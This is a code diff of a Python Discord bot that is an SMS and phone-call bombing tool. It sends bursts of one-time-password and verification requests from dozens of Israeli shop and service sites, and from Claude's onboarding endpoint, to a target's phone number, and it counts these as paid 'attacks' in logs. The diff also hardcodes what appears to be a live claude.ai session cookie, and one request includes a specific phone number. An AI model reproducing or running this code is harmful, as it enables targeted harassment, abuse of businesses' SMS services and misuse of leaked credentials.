@@ -30,11 +30,12 @@ CREDITS_PER_CYCLE = 3
 MAX_CREDIT_SPEND = 100
 LAUNCH_DELAY = 5
 
-COLOR_MAIN = 0x2b2d31
-COLOR_SUCCESS = 0x00ff00
-COLOR_DANGER = 0xff0000
-COLOR_WARNING = 0xffaa00
-COLOR_INFO = 0x00aaff
+# עיצוב חדש ומשופר
+COLOR_MAIN = 0x5865F2  # צבע כחול של דיסקורד
+COLOR_SUCCESS = 0x57F287  # ירוק
+COLOR_DANGER = 0xED4245  # אדום
+COLOR_WARNING = 0xFEE75C  # צהוב
+COLOR_INFO = 0x5865F2  # כחול
 
 CLAUDE_SESSION = "activitySessionId=8e5e644c-d640-4b9f-be61-59b9a138a42b; anthropic-device-id=4ed16e2b-8252-4456-8e7a-e466ede65652; _fbp=fb.1.1773186995656.51415631283246056; app-shell-mode=gate-disabled; CH-prefers-color-scheme=light; __ssid=aac9d1c5-0950-4438-b7ea-a89a1639d015; cookie_seed_done=1; intercom-device-id-lupk8zyo=f68271ce-ab05-40b7-b143-901ad283a161; user-sidebar-visible-on-load=true; user-recents-collapsed=false; user-sidebar-pinned=true; g_state={\"i_l\":0,\"i_ll\":1773414635601,\"i_b\":\"y3RrxvHpC/63IgqxQoW+FkAztdzRlQfKqrSCo5paIW4\",\"i_e\":{\"enable_itp_optimization\":0},\"i_t\":1773501035602}; __cf_bm=3VjDxw6wkQm2wlbHFDvk8MaDT_DB6R36F4R.MVnz0p4-1773447632-1.0.1.1-6q05RiFdtxB27W.Dlk8sZzMKN2_GWuJqrNh03eIFieCaneWW7KiQJxVTVTNIxcxA4EeiLytjTSnQLzFe5XvedaBVzIzDp_EoeqS.drKNHic; _cfuvid=zbw_U3cChwMfKZyPfROexrLBbuzQTKW2FW6ko.UebTU-1773447632362-0.0.1.1-604800000; __stripe_mid=eabdbe50-cd60-4100-9f89-6403dde971eb6b036c; __stripe_sid=7b2497e5-5647-4528-aa38-9272e68de8c5289f41; sessionKey=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; lastActiveOrg=2b096853-0284-4d04-8bee-d3d6eb9ec7b1; cf_clearance=CM9MGR4oytc4fDuAdMWrgtGLrwjHrZfyGjDHQmELKWs-1773447692-1.2.1.1-8qu2TBglm35vOa3Y5dwU3Ue0D7gBkTfD20EtG9u.GXPEkWyTnnSOlsalbwktHG1lj9TvVOnuD19OeZaXbAIFnPMBAT3VnNkt2Rg5J8MQ9qAXN3Wf3DwDbPI.qiNUmVZwwvjmHdyRkI.fuz248__ESMWvCdMkeASIwHP7DT5e14INWZ3.iSxdKpFmZwoKzVGj1ge2Bba07dhQbqnbXVM1J7Ov4yMposOalAOKdx7hZN4; ajs_user_id=34d05785-fcf5-4298-8314-ac95766337ff; ajs_anonymous_id=64ed414c-6982-4d71-803f-2241e4e9546a; intercom-session-lupk8zyo=QTJuM3pjOVY3bWs1Njc4T0ZBQlZ1T2V6OUx0bjREempveE5JalZsR0FNMEpZYjdXZ3BYUE83WnhxYXV4S0tZSTdORlluTUc2OE14UnVCRHhBcjlzdE42SFo1ZW1NK1hWeEtZeTA0Y0hYYzlvcTN0RlBCa2YxV3JRbGJHM1B4WFltZVNNWk1QUXhWMzBEclNvUFphUTZNNTV0dk12T2s5QzhYSGN2U0pkeWNHM2NSOEZyMUU3amxwU2N5MGc4VkRpVEFZS0JrQzF3MFUyc2pzZlJyV0lTdXlDNncvYUYzcjQ1UkRkbzdmRTA1MnhiSHliZSt0akc2NjBzdjUyV2VwVkNQZ3ptd09xRzZZOTJMMXZEUzFVNmxxb3RTNG1ZYWs1K3Y5RFBTQXhiM1k9LS1YdEp3STBsUkF2S2FWSFptb29sYzFnPT0=--94e9f81d682285fead0655379f59452a0e43ab83; routingHint=sk-ant-rh-eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJFUzI1NiIsICJraWQiOiAiN0MxcWFPRnhqdWxaUjRFQnNuNk1UeUZGNWdDV2JHbFpNVDR2RklrRFFpbyJ9.eyJzdWIiOiAiMzRkMDU3ODUtZmNmNS00Mjk4LTgzMTQtYWM5NTc2NjMzN2ZmIiwgImlhdCI6IDE3NzM0NDc2OTYsICJpc3MiOiAiY2xhdWRlLWFpLXJvdXRpbmciLCAib25ib2FyZGluZ19jb21wbGV0ZSI6IHRydWUsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAiYWdlX3ZlcmlmaWVkIjogdHJ1ZSwgImxvY2FsZSI6ICJlbi1VUyJ9.yRj_WgY7-XZbfW8XvjAb8ybkDmv2wDhrNH2WqAywFX2DVfMGZayA92Tj5WJwB3-kcV2JC3Un2eERG-bLEPQlAw; _gcl_au=1.1.357471279.1773367551.67089487.1773447650.1773447710; _dd_s=aid=631a5dba-fcfc-4e29-854f-58b2ec36a49d&rum=0&expire=1773448656835"
 
@@ -135,61 +136,8 @@ async def save_log(user_id: int, username: str, phone: str, cost: int, success: 
     }
     await logs_collection.insert_one(entry)
 
-async def get_user_logs(user_id: int, limit: int = 20):
-    cursor = logs_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(limit)
-    return await cursor.to_list(length=limit)
-
-async def get_all_logs(limit: int = 100):
-    cursor = logs_collection.find().sort("timestamp", -1).limit(limit)
-    return await cursor.to_list(length=limit)
-
-async def get_user_stats(user_id: int):
-    pipeline = [
-        {"$match": {"user_id": user_id}},
-        {"$group": {
-            "_id": "$user_id",
-            "total_attacks": {"$sum": 1},
-            "total_cost": {"$sum": "$cost"},
-            "total_success": {"$sum": "$success_count"},
-            "total_failed": {"$sum": "$failed_count"},
-            "total_requests": {"$sum": "$total"},
-            "last_attack": {"$max": "$timestamp"}
-        }}
-    ]
-    result = await logs_collection.aggregate(pipeline).to_list(1)
-    return result[0] if result else None
-
-async def get_global_stats():
-    pipeline = [
-        {"$group": {
-            "_id": None,
-            "total_attacks": {"$sum": 1},
-            "total_cost": {"$sum": "$cost"},
-            "total_success": {"$sum": "$success_count"},
-            "total_failed": {"$sum": "$failed_count"},
-            "total_requests": {"$sum": "$total"},
-            "unique_users": {"$addToSet": "$user_id"}
-        }}
-    ]
-    result = await logs_collection.aggregate(pipeline).to_list(1)
-    if result:
-        result[0]["unique_users"] = len(result[0]["unique_users"])
-        return result[0]
-    return None
-
-async def get_top_targets(limit: int = 10):
-    pipeline = [
-        {"$group": {
-            "_id": "$phone",
-            "count": {"$sum": 1},
-            "success_total": {"$sum": "$success_count"}
-        }},
-        {"$sort": {"count": -1}},
-        {"$limit": limit}
-    ]
-    return await logs_collection.aggregate(pipeline).to_list(length=limit)
-
-async def send_request(session, url, form=None, json_data=None, headers_extra=None, tag=""):
+# פונקציות הספאם - תוקנו עם await נכון
+async def send_request(session, url, form=None, json_data=None, headers_extra=None, tag="", method="POST"):
     headers = {
         "User-Agent": random_agent(),
         "Accept": "application/json, text/plain, */*",
@@ -199,11 +147,16 @@ async def send_request(session, url, form=None, json_data=None, headers_extra=No
     }
     if headers_extra:
         headers.update(headers_extra)
-    if isinstance(form, str):
-        headers.setdefault("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+    
     try:
         timeout = aiohttp.ClientTimeout(total=12)
-        if json_data is not None:
+        
+        if method == "GET":
+            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
+                await resp.read()
+                ok = 200 <= resp.status < 300
+                return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+        elif json_data is not None:
             headers.setdefault("Content-Type", "application/json")
             async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False) as resp:
                 await resp.read()
@@ -245,13 +198,13 @@ async def atmos_request(session, store_id, phone, origin="https://order.atmos.re
 
 async def process_atmos_batch(session, target, stores):
     results = []
-    batch = 5
+    batch = 3  # הקטנתי את הכמות כדי למנוע התעייפות
     for i in range(0, len(stores), batch):
         group = stores[i:i + batch]
         tasks = [atmos_request(session, sid, target) for sid in group]
         res = await asyncio.gather(*tasks, return_exceptions=True)
         results.extend(res)
-        await asyncio.sleep(0.5)
+        await asyncio.sleep(1)  # הוספת השהייה
     return results
 
 async def claude_request(session, phone):
@@ -266,14 +219,6 @@ async def claude_request(session, phone):
         "content-type": "application/json",
         "origin": "https://claude.ai",
         "referer": "https://claude.ai/onboarding",
-        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
-        "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "empty",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-site": "same-origin",
-        "anthropic-client-platform": "web_claude_ai",
-        "anthropic-client-version": "1.0.0",
         "user-agent": random_agent()
     }
     if CLAUDE_SESSION:
@@ -376,34 +321,14 @@ async def run_all(phone: str):
     formatted = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
     sid = str(uuid.uuid4())
     random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
-    FORM_TYPE = "application/x-www-form-urlencoded; charset=UTF-8"
-    BROWSER_ID = '"Google Chrome";v="145", "Chromium";v="145", "Not/A)Brand";v="24"'
-
-    def form_headers(origin, referer, extra=None):
-        h = {"Content-Type": FORM_TYPE, "x-requested-with": "XMLHttpRequest",
-             "origin": origin, "referer": referer,
-             "sec-ch-ua": BROWSER_ID, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-             "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin"}
-        if extra:
-            h.update(extra)
-        return h
-
-    def json_headers(origin, referer, extra=None):
-        h = {"Content-Type": "application/json",
-             "origin": origin, "referer": referer,
-             "sec-ch-ua": BROWSER_ID, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-             "sec-fetch-dest": "empty", "sec-fetch-mode": "cors"}
-        if extra:
-            h.update(extra)
-        return h
-
-    connector = aiohttp.TCPConnector(limit=120, ttl_dns_cache=300)
+    
+    connector = aiohttp.TCPConnector(limit=50, ttl_dns_cache=300)
     async with aiohttp.ClientSession(connector=connector) as s:
+        # Atmos stores - רשימה מצומצמת יותר
         atmos_stores = [
             "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
             "28","29","33","35","48","51","56","57","59",
-            "2008","2011","2012","2014","2041","2052","2053","2056","2059",
-            "2063","2070","2073","2076","2078","2087","2088","2091",
+            "2008","2011","2012","2014","2041","2052","2053","2056"
         ]
         atmos_res = await process_atmos_batch(s, raw, atmos_stores)
         
@@ -420,7 +345,6 @@ async def run_all(phone: str):
         tasks = [
             send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
                 json_data={"agreeTou": True, "phone": formatted},
-                headers_extra=json_headers("https://netfree.link", "https://netfree.link/welcome/", {"sec-fetch-site": "same-origin"}),
                 tag="netfree"),
             claude_request(s, raw),
             oshioshi_request(s, raw),
@@ -429,261 +353,66 @@ async def run_all(phone: str):
             freeivr_request(s, raw),
             send_request(s, "https://www.negev-group.co.il/customer/ajax/post/",
                 form=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.negev-group.co.il", "https://www.negev-group.co.il/", {"sec-fetch-site": "same-origin"}),
                 tag="negev-group"),
             send_request(s, "https://www.gali.co.il/customer/ajax/post/",
                 form=f"form_key=xT4xBP6oaqFhxMVR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.gali.co.il", "https://www.gali.co.il/"),
                 tag="gali"),
             send_request(s, "https://www.aldoshoes.co.il/customer/ajax/post/",
                 form=f"form_key=FD1Zm1GUMQXUivz6&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.aldoshoes.co.il", "https://www.aldoshoes.co.il/"),
                 tag="aldoshoes"),
-            send_request(s, "https://www.hoodies.co.il/customer/ajax/post/",
-                form=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.hoodies.co.il", "https://www.hoodies.co.il/"),
-                tag="hoodies"),
             send_request(s, "https://api.gomobile.co.il/api/login",
-                form=f'{{"phone":"{raw}"}}',
-                headers_extra=form_headers("https://www.gomobile.co.il", "https://www.gomobile.co.il/"),
+                json_data={"phone": raw},
                 tag="gomobile"),
             send_request(s, "https://bonitademas.co.il/apps/imapi-customer",
-                form=f'{{"action":"login","otpBy":"sms","otpValue":"{raw}"}}',
-                headers_extra=form_headers("https://bonitademas.co.il", "https://bonitademas.co.il/"),
+                json_data={"action":"login","otpBy":"sms","otpValue":raw},
                 tag="bonitademas"),
-            send_request(s, "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
-                form=f'{{"phone":"{raw}"}}',
-                headers_extra=form_headers("https://storyonline.co.il", "https://storyonline.co.il/"),
-                tag="storyonline"),
             send_request(s, "https://www.crazyline.com/customer/ajax/post/",
                 form=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.crazyline.com", "https://www.crazyline.com/"),
                 tag="crazyline"),
-            send_request(s, "https://authentication.wolt.com/v1/captcha/site_key_authenticated",
-                json_data={"phone_number": f"{raw}", "operation": "request_number_verification"},
-                headers_extra=form_headers("https://wolt.com", "https://wolt.com/"),
-                tag="wolt"),
-            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2",
-                form=f'{{"phoneNumber": "{raw}", "isCalling": true}}',
-                headers_extra=form_headers("https://www.mishloha.co.il", "https://www.mishloha.co.il/"),
-                tag="mishloha"),
-            send_request(s, "https://www.golfkids.co.il/customer/ajax/post/",
-                form=f"form_key=XB0c9tAkTouRgHrI&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.golfkids.co.il", "https://www.golfkids.co.il/"),
-                tag="golfkids"),
-            send_request(s, "https://www.onot.co.il/customer/ajax/post/",
-                form=f"form_key=xmemtkBNMoUSLrMN&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.onot.co.il", "https://www.onot.co.il/"),
-                tag="onot"),
             send_request(s, "https://fox.co.il/apps/dream-card/api/proxy/otp/send",
-                form=f'{{"phoneNumber":"{raw}","uuid":"498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"}}',
-                headers_extra=form_headers("https://fox.co.il", "https://fox.co.il/"),
+                json_data={"phoneNumber":raw,"uuid":"498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"},
                 tag="fox"),
             send_request(s, "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",
-                form=f'{{"phoneNumber":"{raw}","uuid":"6db5a63b-6882-414f-a090-de263dd917d7"}}',
-                headers_extra=form_headers("https://www.foxhome.co.il", "https://www.foxhome.co.il/"),
+                json_data={"phoneNumber":raw,"uuid":"6db5a63b-6882-414f-a090-de263dd917d7"},
                 tag="foxhome"),
             send_request(s, "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",
-                form=f'{{"phoneNumber":"{raw}","uuid":"ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}}',
-                headers_extra=form_headers("https://www.laline.co.il", "https://www.laline.co.il/"),
+                json_data={"phoneNumber":raw,"uuid":"ab29f239-0637-4c8e-8af5-fdfbaeb4b493"},
                 tag="laline"),
             send_request(s, "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
-                form=f'{{"phoneNumber":"{raw}","uuid":"9961459f-9f83-4aab-9cee-58b1f6793547"}}',
-                headers_extra=form_headers("https://footlocker.co.il", "https://footlocker.co.il/"),
+                json_data={"phoneNumber":raw,"uuid":"9961459f-9f83-4aab-9cee-58b1f6793547"},
                 tag="footlocker"),
             send_request(s, "https://www.golfco.co.il/customer/ajax/post/",
                 form=f"form_key=SIiL0WFN6AtJF6lb&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.golfco.co.il", "https://www.golfco.co.il/"),
                 tag="golfco"),
-            send_request(s, "https://www.timberland.co.il/customer/ajax/post/",
-                form=f"form_key=gU7iqYv5eiwuKVef&bot_validation=1&type=login&phone={raw}",
-                headers_extra=form_headers("https://www.timberland.co.il", "https://www.timberland.co.il/"),
-                tag="timberland"),
             send_request(s, "https://www.solopizza.org.il/_a/aff_otp_auth",
                 form=f"value={raw}&type=phone&projectId=1",
-                headers_extra=form_headers("https://www.solopizza.org.il", "https://www.solopizza.org.il/"),
                 tag="solopizza"),
             send_request(s, "https://users-auth.hamal.co.il/auth/send-auth-code",
-                form=f'{{"value":"{raw}","type":"phone","projectId":"1"}}',
-                headers_extra=form_headers("https://hamal.co.il", "https://hamal.co.il/"),
+                json_data={"value":raw,"type":"phone","projectId":"1"},
                 tag="hamal"),
             send_request(s, "https://www.urbanica-wh.com/customer/ajax/post/",
                 form=f"form_key=sucdtpszDEqdOgkv&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.urbanica-wh.com", "https://www.urbanica-wh.com/"),
                 tag="urbanica"),
             send_request(s, "https://www.intima-il.co.il/customer/ajax/post/",
                 form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.intima-il.co.il", "https://www.intima-il.co.il/"),
                 tag="intima"),
             send_request(s, "https://www.steimatzky.co.il/customer/ajax/post/",
                 form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.steimatzky.co.il", "https://www.steimatzky.co.il/"),
                 tag="steimatzky"),
             send_request(s, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
                 form=f"value={raw}&value_type=",
-                headers_extra=form_headers("https://www.globes.co.il", "https://www.globes.co.il/"),
                 tag="globes"),
-            send_request(s, "https://www.moraz.co.il/wp-admin/admin-ajax.php",
-                form=f"action=validate_user_by_sms&phone={raw}&email=&from_reg=false",
-                headers_extra=form_headers("https://www.moraz.co.il", "https://www.moraz.co.il/", {"sec-fetch-site": "same-origin"}),
-                tag="moraz"),
-            send_request(s, "https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send",
-                json_data={"phoneNumber": raw, "uuid": sid},
-                headers_extra=json_headers("https://itaybrands.co.il", "https://itaybrands.co.il/", {"sec-fetch-site": "same-origin", "x-requested-with": "XMLHttpRequest"}),
-                tag="itaybrands"),
-            send_request(s, "https://www.spicesonline.co.il/wp-admin/admin-ajax.php",
-                form=f"action=validate_user_by_sms&phone={raw}",
-                headers_extra=form_headers("https://www.spicesonline.co.il", "https://www.spicesonline.co.il/"),
-                tag="spicesonline"),
-            send_request(s, "https://www.stepin.co.il/customer/ajax/post/",
-                form=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.stepin.co.il", "https://www.stepin.co.il/"),
-                tag="stepin"),
             send_request(s, "https://mobile.rami-levy.co.il/api/Helpers/OTP",
                 form=f"phone={raw}&template=OTP&type=1",
-                headers_extra={"Content-Type": "application/x-www-form-urlencoded", "accept-encoding": "gzip, deflate", "origin": "https://mobile.rami-levy.co.il", "referer": "https://mobile.rami-levy.co.il/", "x-requested-with": "XMLHttpRequest", "User-Agent": random_agent()},
                 tag="ramilevy"),
             send_request(s, "https://api.zygo.co.il/v2/auth/create-verify-token",
                 json_data={"phone": raw},
-                headers_extra={"Content-Type": "application/json", "origin": "https://zygo.co.il", "referer": "https://zygo.co.il/", "accept-encoding": "gzip, deflate", "sec-fetch-site": "same-site"},
                 tag="zygo"),
-            send_request(s, "https://ros-rp.tabit.cloud/services/loyalty/customerProfile/auth/mobile",
-                json_data={"mobile": raw},
-                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "accountguid": "0787F516-E97E-408A-A1CF-53D0C4D57C7C", "cpversion": "3.3.0", "env": "il", "joinchannelguid": "74FE1A48-0FA0-4C8F-B962-6AE88A242023", "siteid": "6203e7787694b434c7a7eb0a", "origin": "https://customer-profile.tabit.cloud", "referer": "https://customer-profile.tabit.cloud/", "sec-fetch-site": "same-site"},
-                tag="tabit"),
-            send_request(s, "GET", f"https://ivr.business/api/Customer/getTempCodeToPhoneVarification/{raw}",
-                headers_extra={"origin": "https://ivr.business", "referer": "https://ivr.business/", "accept-encoding": "gzip, deflate"},
-                tag="ivr"),
-            send_request(s, "POST", "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer",
-                form={"configCode": "ivr2_10_23", "uniqCustomerId": "68058a89-fedd-4409-8725-f989652d8305", "gr": "0cAFcWeA5PbEgcsunaaEtl6NGj42rsCw_j-mRZXXcpIwHiMkRv8_z5ALroAy4nrB5H0d9_3EmAT5lir9rdEUmYgJcljVuwkmXejS2XpA8D-SslaqIGDAxdoPpt8avI4LEirhzVHZS84ELsjkcSVnE9MHDQf4uGnuT99SpOJqr5vrQ8eamoK2JopgSoYOeSJ-jxvTkahhmphpEWQM6hqtF0MU80L7zXTCiBd0pizXHWf904G_emSIqIrmaU5bgE9EM6gH3Zj8hcVmI-7L-eQ0vRdQioD_TAC4WhCJ4GRwhKqNIM3VVh3OoT8I24BqoT1VPptonhRje1XR7g1gB_vRbQieoXLXkHq8oCX5PgC9AtSbHwD88F7bfyNRlt5n44OPa5UnBnIx58aJlDk5sRXqV9EHpJOVMg08S4M4FzIDbYEKOPHHrnfWujAdjNsHfkmjezSFcfk4IAAgjCTfkXlxhGZ6lKKoJzbX7p3n1NcmtJ2M9W3nU01-J3w6e4PmR3gDXTp2LvkBQPUf2V-ZeHaQZYMAZDKnkgbLDrgmUofR232uXigH8MDrKyctqUeXJdApEFZnPg4OGvSXXCNx5qmDRnjsgf_S-nFOBJhyAXqh2H-1i8d5lHD0NO-fXB9gj_bPd5g9Dy9fBG96bsYrAnpzOGDoETucSkhY9nh9ZR7eS5efKUTf_UD-Ml6sYdEmdaL-vj90IZFwHKTf51n5XJ7DpU9gSO-TlOH4_RoGFdbO4Cbyf1QgPuJe1oRVl4XCnad4EEyO1WRL5D33Rg-SLWzDMHUrjzKYVcX6TJyledkhCyaVpiG5-Jtc4P2ER1Vd9qhZoXTmyY8Qhxku8fpiur6Kgn7vJhz21gmFfytzHwQyFxMNtYKGGy9i3f_vrcVZtAn-Hl9AOLh825jWS3dGIou4zIaAoWxIyHTPF1YewbwXXLxguzD1b0OdLN-4H2aaGG5-4xj4Kpj0ObbCJSXNYrkRZ6lXS--aOoHreDg4rMN8os-_lyKHQvxvQbNAbC3u9xf73X_zpNPU6riKHRIVDnZvUMdpm_fPtnc3w6Vc5aTMJJPmP-axLkT4g0hd9j8RaCkXKMSaszT60elGULw-t-oA79BkTi2x5xuStGScG_35Kk9kP6B7mvtuDmhqQe1c5vabCuj_ueyWod8LXeEpX5wPOKjyDNVhjSS4IJt_LDLl1ecc4seD6s9yC1INKUQFIe52J37ekfrh2rLSqw1ERZ2Vl_YziFDTE4OHpAh1Y3rOI4jqXaYyRVnt4PvNBjkYuPcImXrQxB-yM6AHA_5QzZByozp2ZD39zVPzC6uATt72ZLXnoxNE6Bxa0QkOElaIuSkHv0JiL4VPzjPgE4J3cTK9zESKE7M7KO89NUToDVJ6vrT06MnY12nZJtYjtgLoba0nqVl1512nIHV12bK3MZpbOzrl2hNoEMbUM-KZsyMlnoQZHy2_n8I3YZwgTMTD2Os6YGSG4IViPy2xZ-jf70bmBaT48XgW0JDPKIGXSMZYY9SEIn4FnbvE0iageIOaRA8GI8urP5Gm345SPFFlTJHOPFYZncz8wmbFOb6Sj2lhO0PBT6rWMpmEpjpSFatJkCRxocQVrcTLZx8nrgvmoGDieH_RG--juXCrwmcAiX0hN56lKOFpoh0RUX6mQTPY1X1O7M05l7iYpy3D_l_KcxgpDg61AdYuq_oFC_xdd99bVScV-2YcxAIkx4ggpU7IuLOHtvoPn-bftPxaOSI3gepj0TbIioHZ4dvSI3-RgGHRWVmb7GRntKT7r5VqT10frTJEa9ZtIyrH2QfRBWB0SaSBZ7pjEtmK1hoBouEdimg8JyTnSfq64DtJZnStDTWEdC6dpqOXbeI3fgV6angRqH9dJxY_Mgjo1Rj7Oo_xr2UadXo3kLj_p3CLfG8ryBcZnK0OtHm-w0EzdS6ouaNdfQZ6a0BcYPlCli605PEf3C2Ef-LCCYGIQjZ4hdvkXHE5YSyroCzUUNtI9HRLWsIildw9LUHz4G4U5fLlilCQq0L2W3VS-0OBrpJU2e17wRL3802ILYquN2KRrbtQz0-IllIPPEqX52EF5lBV7L1dnguGK5Lr1417W9l9mdhnUkAuE_T9dQ7_mucqcgFu3EZCAkMWEb6cuae4SELDtLQ1ch_CFQR1oGpe8wLnsyEwboyoe-nr2nfwLnuC7sc5ugnliWgc6GLMlVQQEbrLKGD9tQS98nT-LKVUrqyQkcmFE", "phone": "0504414408", "sendCodeBy": "CALL", "step": "SendValidPhone", "token": "menualWS_ymta", "uniqCustomerId": "68058a89-fedd-4409-8725-f989652d8305"},
-                headers_extra={"origin": "https://www.call2all.co.il", "referer": "https://www.call2all.co.il/", "accept-encoding": "gzip, deflate"},
-                tag="call2all"),
-            send_request(s, "POST", "https://rest-api.dibs-app.com/otps",
-                json_data={"phoneNumber": formatted},
-                headers_extra=json_headers("https://dibs-app.com", "https://dibs-app.com/", {"sec-fetch-site": "same-site"}),
-                tag="dibs"),
-            send_request(s, "POST", "https://www.nine-west.co.il/customer/ajax/post/",
-                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.nine-west.co.il", "https://www.nine-west.co.il/"),
-                tag="ninewest"),
-            send_request(s, "POST", "https://www.leecooper.co.il/customer/ajax/post/",
-                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.leecooper.co.il", "https://www.leecooper.co.il/"),
-                tag="leecooper"),
-            send_request(s, "POST", "https://www.kikocosmetics.co.il/customer/ajax/post/",
-                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.kikocosmetics.co.il", "https://www.kikocosmetics.co.il/"),
-                tag="kiko"),
-            send_request(s, "POST", "https://www.topten-fashion.com/customer/ajax/post/",
-                form=f"form_key=soiphrLs3vM2A1Ta&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.topten-fashion.com", "https://www.topten-fashion.com/"),
-                tag="topten"),
-            send_request(s, "POST", "https://www.lehamim.co.il/_a/aff_otp_auth",
-                form=f"phone={raw}",
-                headers_extra={**form_headers("https://www.lehamim.co.il", "https://www.lehamim.co.il/"), "sec-fetch-site": "same-origin"},
-                tag="lehamim"),
-            send_request(s, "POST", "https://www.555.co.il/ms/rest/otpservice/client/send/phone?contentContext=3&returnTo=/pearl/apps/vehicle-policy?insuranceTypeId=1",
-                json_data={"password": None, "phoneNr": raw, "sendType": 1, "systemType": None},
-                headers_extra=json_headers("https://www.555.co.il", "https://www.555.co.il/", {"sec-fetch-site": "same-origin"}),
-                tag="555"),
-            send_request(s, "POST", "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
-                form=f"action=simply-check-member-cellphone&cellphone={raw}",
-                headers_extra=form_headers("https://www.jungle-club.co.il", "https://www.jungle-club.co.il/"),
-                tag="jungleclub"),
-            send_request(s, "POST", "https://blendo.co.il/wp-admin/admin-ajax.php",
-                form=f"action=simply-check-member-cellphone&cellphone={raw}",
-                headers_extra=form_headers("https://blendo.co.il", "https://blendo.co.il/"),
-                tag="blendo"),
-            send_request(s, "POST", "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
-                json_data={"phoneNumber": raw, "sourceFrom": "AuthJS", "isCalling": True},
-                headers_extra=json_headers("https://mishloha.co.il", "https://mishloha.co.il/", {"sec-fetch-site": "same-site"}),
-                tag="mishloha"),
-            send_request(s, "POST", "https://we.care.co.il/wp-admin/admin-ajax.php",
-                form=(f"post_id=351178&form_id=7079d8dd&referer_title=Care&queried_id=351178&form_fields[name]=CyberIL&form_fields[phone]={raw}&form_fields[email]={random_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form&referrer=https://we.care.co.il/"),
-                headers_extra=form_headers("https://we.care.co.il", "https://we.care.co.il/glasses-tor/"),
-                tag="wecare"),
-            send_request(s, "POST", "https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",
-                form=f"MosadId=7000297&ClientName=CyberIL&Phone={raw}&Amount=100&Tashlumim=1",
-                headers_extra={"Content-Type": FORM_TYPE, "accept-encoding": "gzip, deflate", "referer": "https://www.matara.pro/", "origin": "https://www.matara.pro"},
-                tag="matara"),
-            send_request(s, "POST", "https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",
-                form=(f"action=otp_register&otp_phone={raw}&first_name=Cyber&last_name=IL&email={random_email}&date_birth=2000-11-11&approve_terms=true&approve_marketing=true"),
-                headers_extra=form_headers("https://wissotzky-tlab.co.il", "https://wissotzky-tlab.co.il/"),
-                tag="wissotzky"),
-            send_request(s, "POST", "https://clocklb.ok2go.co.il/api/v2/users/login",
-                json_data={"phone": raw},
